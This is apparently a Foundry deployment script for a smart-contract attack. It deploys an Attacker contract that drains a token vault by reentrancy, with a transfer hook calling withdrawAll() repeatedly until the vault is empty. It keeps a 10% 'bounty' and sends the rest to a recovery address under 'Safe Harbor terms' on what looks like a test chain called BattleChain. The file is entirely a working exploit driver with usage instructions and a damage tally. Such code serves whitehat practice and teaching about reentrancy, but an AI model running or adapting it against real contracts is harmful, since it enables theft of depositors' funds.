// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Attacker} from "../src/Attacker.sol";

/// @notice
///         The attack flow:
///           1. Register a transfer hook on MockToken so this contract gets a callback on receive
///           2. Deposit seed tokens to establish a non-zero balance in the vault
///           3. Call withdrawAll() — vault transfers tokens, triggering our hook
///           4. Inside onTokenTransfer(), call withdrawAll() again (balance still non-zero)
///           5. Repeat until the vault is empty
///           6. You're on BattleChain — split the haul per Safe Harbor terms and walk away clean
///
/// Prerequisites — set in .env:
///   TOKEN_ADDRESS, VAULT_ADDRESS, RECOVERY_ADDRESS
///
/// Usage:
///   forge script script/Attack.s.sol --rpc-url battlechain --broadcast
contract Attack is Script {
    uint256 constant SEED_AMOUNT = 100e18; // enough to open a position — the vault does the rest
    uint256 constant BOUNTY_BPS = 1_000; // 10% — as agreed in the Safe Harbor terms

    function run() external {
        uint256 attackerKey = vm.envUint("PRIVATE_KEY");
        address attackerAddr = vm.addr(attackerKey);
        address token = vm.envAddress("TOKEN_ADDRESS");
        address vault = vm.envAddress("VAULT_ADDRESS");
        address recoveryAddress = vm.envAddress("RECOVERY_ADDRESS");

        uint256 vaultBefore = IERC20(token).balanceOf(vault);
        console.log("Vault balance before:", vaultBefore / 1e18, "tokens");
        console.log("Deploying attacker...");

        vm.startBroadcast(attackerKey);

        // Deploy the attacker — pointed at the vault, armed with bounty terms
        Attacker attacker = new Attacker(vault, token, recoveryAddress, BOUNTY_BPS);

        // Pull the trigger. One hook registration, one deposit, one withdrawal —
        // the vault's own logic does the rest.
        attacker.attack(SEED_AMOUNT);

        vm.stopBroadcast();

        // Tally the damage
        uint256 vaultAfter = IERC20(token).balanceOf(vault);
        uint256 bounty = IERC20(token).balanceOf(attackerAddr);
        uint256 returned = IERC20(token).balanceOf(recoveryAddress);

        console.log("\n--- Vault drained ---");
        console.log("Vault before:      ", vaultBefore / 1e18, "tokens");
        console.log("Vault after:       ", vaultAfter / 1e18, "tokens");
        console.log("Bounty kept:       ", bounty / 1e18, "tokens");
        console.log("Returned to protocol:", returned / 1e18, "tokens");
    }
}
